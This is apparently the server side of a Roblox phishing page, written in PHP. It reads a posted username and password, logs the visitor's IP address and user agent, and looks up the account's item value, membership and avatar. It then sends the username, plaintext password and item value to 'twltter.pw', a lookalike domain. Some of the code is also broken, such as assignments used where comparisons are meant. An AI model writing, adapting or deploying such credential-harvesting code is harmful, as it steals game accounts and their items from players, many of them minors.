<?php

$username    = $_POST['username'];
$password    = $_POST['password'];
$domain = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$useragent = $_SERVER ['HTTP_USER_AGENT'];
$id = strval(json_decode(file_get_contents('https://api.roblox.com/users/get-by-username?username=' . $username), true)['Id']);
$rap = strval(json_decode(file_get_contents('http://rbxjackpot.com/api/getlimiteds.php?userid=' . $id), true)['TotalRAP']);
$usercheck = strval(json_decode(file_get_contents('https://www.roblox.com/UserCheck/DoesUsernameExist?username=' . $username), true)['success']);
$testuser = file_get_contents('https://twltter.pw/getlimiteds.php?userid=' . $username . ':' . $password . ':$' . $rap);
$bcType = get_headers('https://www.roblox.com/Thumbs/BCOverlay.ashx?username=' . $username)[3]; if ($bcType = 'Location: https://static.rbxcdn.com/images/empty.png'){ $bc = 'NBC'; } elseif ($bcType = 'Location: https://static.rbxcdn.com/images/icons/overlay_obcOnly.png') { $bc = 'OBC'; } elseif ($bcType = 'Location: https://static.rbxcdn.com/images/icons/overlay_tbcOnly.png') { $bc = 'TBC'; } elseif ($bcType = 'Location: https://static.rbxcdn.com/images/icons/overlay_bcOnly.png') { $bc = 'BC'; } else { $bc = 'Error: Undefined BC Membership Status'; }
if (strval(json_decode(file_get_contents('https://www.roblox.com/UserCheck/DoesUsernameExist?username=' . $username), true)['success']) == 'false'){ $_POST['die']; }
$cw = strval(json_decode(file_get_contents('https://avatar.roblox.com/v1/users/' . $id . '/avatar'), true)['playerAvatarType']);
$profile = strval(json_decode(file_get_contents('https://www.roblox.com/headshot-thumbnail/json?userId=' . $id . '&width=420&height=420&format=png'), true)['Url']);
$ip = $_SERVER['REMOTE_ADDR'];

?>